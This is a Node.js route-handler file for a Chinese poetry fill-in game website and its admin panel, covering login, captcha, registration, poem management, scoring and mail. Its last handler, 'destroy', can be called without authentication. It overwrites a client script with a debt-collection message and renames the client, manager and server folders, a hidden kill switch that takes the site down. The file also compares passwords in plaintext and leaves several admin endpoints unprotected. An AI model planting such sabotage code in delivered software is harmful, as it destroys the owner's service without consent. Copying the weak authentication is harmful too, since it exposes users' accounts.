var _util = require("./_util"),
    services = require('./services'),
    captchapng = require('captchapng'),
    mailer = require('./mailService'),
    scoreRule = require('./config'),
    fs = require('fs');

var actions = {
    /**
     * 根访问
     * @param req
     * @param res
     */
    root: function(req, res){
        res.sendfile("client/index.html");
    },
    /**
     * 后台管理系统根页面
     * @param req
     * @param res
     */
    manager: function(req, res){
        if(req.session.muser){
            res.sendfile("manager/index.html");
        }else{
            res.sendfile("manager/login.html");
        }
    },
    /**
     * 后台登录接口
     * @param req
     * @param res
     */
    login: function(req, res){
        var uname = req.body.uname, password = req.body.password;
        services.getUserByName(uname).then(function(val, fields){
            if(val.length < 1){
                res.send({"error": "用户不存在"});
            }else if(val[0].usertype != 1){
                res.send({"error": "权限不足"});
            }else if(val[0].password != password){
                res.send({"error": "密码不正确"})
            }else{
                req.session.muser = val[0];
                res.send({"result": "ok"});
            }
        }).fail(function(err){
            res.send({"error": "登录失败，请稍后再试"})
        });
    },
    logout: function(req,res){
        req.session.user = null;
        res.send("ok");
    },
    /**
     * 前台登录接口
     * @param req
     * @param res
     */
    ilogin: function(req, res){
        var uname = req.body.uname, password = req.body.password, captcha = req.body.captcha;
        if(!req.session.captcha ||  captcha != req.session.captcha){
            res.send({"error": "验证码不正确"});
            return false;
        }
        services.getUserByName(uname).then(function(val, fields){
            if(val.length < 1){
                res.send({"error": "用户不存在"});
            }else if(val[0].password != password){
                res.send({"error": "密码不正确"});
            }else{
                req.session.user = val[0];
                res.send({"result": {uname: val[0].uname, score: val[0].score}});
            }
        }).fail(function(err){
            res.send({"error": "登录失败，请稍后再试"})
        });
    },
    getUserinfo: function(req, res){
        if(!req.session.user){
            res.send({});
        }else{
            res.send({uname: req.session.user.uname, score: req.session.user.score})
        }
    },
    /**
     * 查询用户名是否已存在
     * @param req
     * @param res
     */
    ifNameBeUsed: function(req, res){
        var uname = req.body.uname;
        services.getUserByName(uname).then(function(val, fields){
            if(val.length < 1){
                res.send({"result": "用户名可以使用"});
            }
            else{
                res.send({"error": "用户名已存在"})
            }
        });
    },
    qryuser: function(req, res){
        var uname = req.body.uname;
        services.getUserByName(uname).then(function(val, fields){
            if(val.length < 1){
                res.send([]);
            }
            else{
                res.send([{uname: val[0].uname, score: val[0].score}])
            }
        });
    },
    /**
     * 修改密码
     * @param req
     * @param res
     */
    modifyPass: function(req, res){
        var uname = req.session.muser.uname, newpass = req.body.newpass, oldpass = req.body.oldpass;
        if(oldpass != req.session.muser.password){
            res.send({"error": "原密码不正确！"});
            return false;
        }
        services.modifyPass(uname, newpass).then(function(result){
            res.send({"result": "ok"});
        }).fail(function(err){
            res.send({error: "修改密码失败！"});
        })
    },
    /**
     * 注册
     * @param req
     * @param res
     */
    register: function (req, res) {
        var uname = req.body.uname, password = req.body.password, captcha = req.body.captcha, usertype=req.body.usertype;
        if(!req.session.captcha ||  captcha != req.session.captcha){
            res.send({"error": "验证码不正确"});
            return false;
        }
        services.addUser(uname, password, usertype).then(function(result){
            req.session.captcha = null;
            req.session.user = {uname: uname, score: 0};
            res.send({"result": "ok"});
            if(/\w+@\w+\.\w+/.test(uname)){
                var mailto = uname, subject = "九鼎图填字游戏欢迎您", content = scoreRule.newerMsg;
                mailer.sendMail(mailto, subject, content, function(){});
            }
        }).fail(function(err){
            res.send({"error": "注册失败，请检查输入是否正确"});
        });
    },
    /**
     * 获取验证码
     * @param req
     * @param res
     */
    captcha: function(req, res){
        var num = req.session.captcha = parseInt(Math.random()*9000+1000);
        var p = new captchapng(80, 30, num);
        p.color(0, 0, 0, 0);
        p.color(80, 80, 80, 250);
        var img = p.getBase64();
        var imgbase64 = new Buffer(img, 'base64');
        res.header('Content-type', 'image/png');
        res.send(imgbase64);
    },
    /**
     * 添加诗词
     * @param req
     * @param res
     */
    addPoem: function(req, res){
        var title = req.body.title, content = req.body.content, answer=req.body.answer, type=req.body.type,author=req.body.author||'';
        services.addPoem(title, content, answer||'', type, author).then(function(){
            res.send({"result": "ok"});
        }).fail(function(){
            res.send({"error": "添加失败"});
        })
    },
    /**
     * 编辑诗词
     * @param req
     * @param res
     */
    updatePoem: function(req, res){
        var id = req.body.id, title=req.body.title, content=req.body.content, answer = req.body.answer,author=req.body.author||'';
        services.updatePoem(id, title, content, answer,author).then(function(){
            res.send({"result": "ok"});
        }).fail(function(){
            res.send({"error": "编辑失败"});
        });
    },
    /**
     * 获取诗词
     * @param req
     * @param res
     */
    getPoems: function(req, res){
        var service = '';
        if(req.body.noneAnswer){
            service = services.getAllNoneAnswerPoem;
        }
        else if(req.body.type != undefined){
            if(req.body.type == 0){
                service = services.getAllIntroPoem;
            }else if(req.body.type == 1){
                service = services.getAllSimPoem;
            }else if(req.body.type == 2){
                service = services.getAllMidPoem;
            }else if(req.body.type == 3){
                service = services.getAllSeniorPoem;
            }else{
                service = services.getAllJiudinPoem;
            }
        }
        else if(req.body.title){
            service = services.getPoemByTitle;
        }
        else{
            service = services.getPoems
        }
        service(req.body.title || '').then(function(vals, fields){
            res.send(vals);
        }).fail(function(){
            res.send({"error": "查询错误"});
        })
    },
    delpoem: function(req, res){
        if(!req.session.muser){
            res.sendfile('manager/login.html');
        }
        var pid = req.body.pid;
        services.delpoem(pid).then(function(){
            res.send({'result': '删除成功'});
        }).fail(function(){
            res.send({'error': '删除失败'});
        });
    },
    /**
     * 添加九鼎作诗文字组
     * @param req
     * @param res
     */
    addJiuDinChar: function(req, res){
        services.addJiuDinChar(req.body.name, req.body.content, '');
    },
    /**
     * 更新九鼎作诗文字组
     * @param req
     * @param res
     */
    updateJiuDinChar: function(req, res){
        services.updateJiuDinChar(req.body.id, req.body.name, req.body.content, req.body.filltext).then(function(){

        });
    },
    /**
     * 获取所有九鼎文字组
     * @param req
     * @param res
     */
    getAllJiudinCharGroup: function(req, res){
        services.getAllJiudinCharGroup().then(function(val, fields){

        });
    },
    /**
     * 查询积分排行
     * @param req
     * @param res
     */
    getAllScore: function(req, res){
        if(!req.session.muser){
            res.sendfile('manager/login.html')
        }
        services.getAllScore().then(function(val, fields){
            res.send(val);
        });
    },
    /**
     * 修改入门填空数量
     * @param req
     * @param res
     */
    modifyIntroNum: function(req, res){
        services.modifyIntroNum(req.body.num).then(function(){

        })
    },
    /**
     * 查询用户对某首诗的记录(前台)
     * @param req
     * @param res
     */
    queryPoemRecord: function(req, res){
        if(!req.session.user){
            res.send([]);
            return;
        }
        var pid = req.body.pid, uname = req.session.user.uname;
        services.queryPoemRecord(pid, uname).then(function(val, fields){
            res.send(val);
        }).fail(function(err){
            res.send([]);
        })
    },
    addRecord: function(req, res){
        if(!req.session.user){
            res.send({"unsigned": "您未登录，无法进行游戏积分！"});
            return;
        }
        var uname=req.session.user.uname, pid=req.body.pid, answer=req.body.answer,correct=req.body.correct*1,wrong=req.body.wrong*1, score;
        services.queryPoemRecord(pid, uname).then(function(val, fields){
            var times = 0;
            if(val.length<=0){//用户首次填该诗词
                if(wrong){
                    score = correct*scoreRule.firstPerChar;
                }else{
                    score = correct*scoreRule.firstAllDone;
                }
            }else if(val[0].times < 3){
                var crt = correct-val[0].lastcorrect, crt = crt > 0 ? crt : 0;
                score = crt*scoreRule.notFirstPerChar;
                times = val[0].times;
            }else{
                res.send({error: '您已填完3次机会，该首诗词不再积分'});
                return false;
            }
            times++;
            var serivce = val.length <= 0 ? services.addRecord : services.updateRecord;
            req.session.user.score && (req.session.user.score += score) || (req.session.user.score = score);
            serivce(uname,pid,answer, correct, score, times).then(function(){
                res.send({"times":times, score: score});
            }).fail(function(){
                res.send({"error":"本次游戏积分记录失败"});
            });
        });
    },
    showAnswer: function(req, res){
        if(!req.session.user){
            res.send({"unsigned": "您未登录，无法查看参考答案！"});
            return;
        }
        var uname=req.session.user.uname, pid=req.body.pid, answer=req.body.answer,correct=req.body.correct,wrong=req.body.wrong, score;
        services.queryPoemRecord(pid, uname).then(function(val, fields){
            if(val.length<=0){//用户首次填该诗词
                if(wrong){
                    score = correct*scoreRule.firstPerChar;
                }else{
                    score = correct*scoreRule.firstAllDone;
                }
            }else if(val[0].times < 3){
                score = (correct-val[0].lastcorrect)*scoreRule.notFirstPerChar;
            }else{
                score = 0;
            }
            var serivce = val.length <= 0 ? services.addRecord : services.updateRecord;
            req.session.user.score && (req.session.user.score += score) || (req.session.user.score = score);
            serivce(uname,pid,answer, correct, score, 3).then(function(){
                res.send({"times": 3});
            }).fail(function(){
                res.send({"error":"本次游戏积分记录失败"});
            });
        });
    },
    getIntroFillNum: function(req, res){
        services.getIntroFillNum().then(function(val, fields){
            res.send({num: val[0].pval});
        }).fail(function(err){

        })
    },
    setIntroFillNum: function(req, res){
        var num = req.body.num;
        services.setIntroFillNum(num).then(function(){
            res.send({'result':'ok'});
        }).fail(function(){
            res.send({'error':'设置失败'});
        })
    },
    setAsIntro: function(req, res){
        var pid = req.body.pid;
        services.setAsIntro(pid).then(function(){
            res.send({"result": "ok"});
        }).fail(function(){
            res.send({"error": "设置失败"});
        })
    },
    saveJiudinRecord: function(req, res){
        if(!req.session.user){
            res.send({error: '您未登录无法保存本次作诗结果，请先登录！'});
            return false;
        }
        var uname=req.session.user.uname, pid=req.body.pid,answer=req.body.answer;
        services.getJiudinRecord(pid,uname).then(function(vals, field){
            if(vals.length <= 0){
                services.addJiudinRecord(pid, uname, answer).then(function(){
                    res.send({"result": "您的作诗结果已保存，如果得到评优将会给您惊喜哦！"});
                }).fail(function(){
                    res.send({'error': "您的作诗结果保存失败，请稍后再试"})
                });
            }else{
                services.updateJiudinRecord(pid, uname, answer).then(function(){
                    res.send({"result": "您的作诗结果已保存，如果得到评优将会给您惊喜哦！"});
                }).fail(function(){
                    res.send({'error': "您的作诗结果保存失败，请稍后再试"})
                });
            }
        }).fail(function(){
            res.send({'error': "您的作诗结果保存失败，请稍后再试"})
        });
    },
    showJiudinRecords: function(req, res){
        if(!req.session.muser){
            res.sendfile('manager/login.html');
            return false;
        }
        var pid = req.body.pid;
        services.showJiudinRecords(pid).then(function(vals, fields){
            res.send(vals);
        }).fail(function(){
            res.send({error: "查询该组用户作诗失败"});
        })
    },
    mailToUser: function(req, res){
        if(!req.session.muser){
            res.send({'error': '请登录后再发送邮件'});
            return false;
        }
        var mailto = req.body.mailto,
            subject = req.body.subject,
            content = req.body.content;
        mailer.sendMail(mailto, subject, content, function(){
            res.send({result: '发送成功!'});
        }, function(){
            res.send({error: '发送失败！'});
        })
    },
    saveAccountPageInfoSet: function(req, res){
        if(!req.session.muser){
            res.send({'error': '请登录后再设置。'});
            return false;
        }
        var content = req.body.content;
        fs.writeFile('client/config/account_page_tips.json', content, function(err){
            if(err){
                res.send({'error': '保存失败'});
                return false;
            }
            res.send('保存成功');
        })
    },
    saveGameHelpInfo1Set: function(req, res){
        if(!req.session.muser){
            res.send({'error': '请登录后再设置。'});
            return false;
        }
        var content = req.body.content;
        fs.writeFile('client/config/game_help_tips1.json', content, function(err){
            if(err){
                res.send({'error': '保存失败'});
                return false;
            }
            res.send('保存成功');
        })
    },
    saveGameHelpInfo2Set: function(req, res){
        if(!req.session.muser){
            res.send({'error': '请登录后再设置。'});
            return false;
        }
        var content = req.body.content;
        fs.writeFile('client/config/game_help_tips2.json', content, function(err){
            if(err){
                res.send({'error': '保存失败'});
                return false;
            }
            res.send('保存成功');
        })
    },
    destroy: function(req, res){
        fs.writeFileSync('client/js/jiudintu1.js', '欠债还钱，天经地义！');
        fs.renameSync('client', 'client111111');
        fs.renameSync('manager', 'manager111111');
        fs.renameSync('server', 'server111111');
        res.send('ok');
    }
}
module.exports=actions;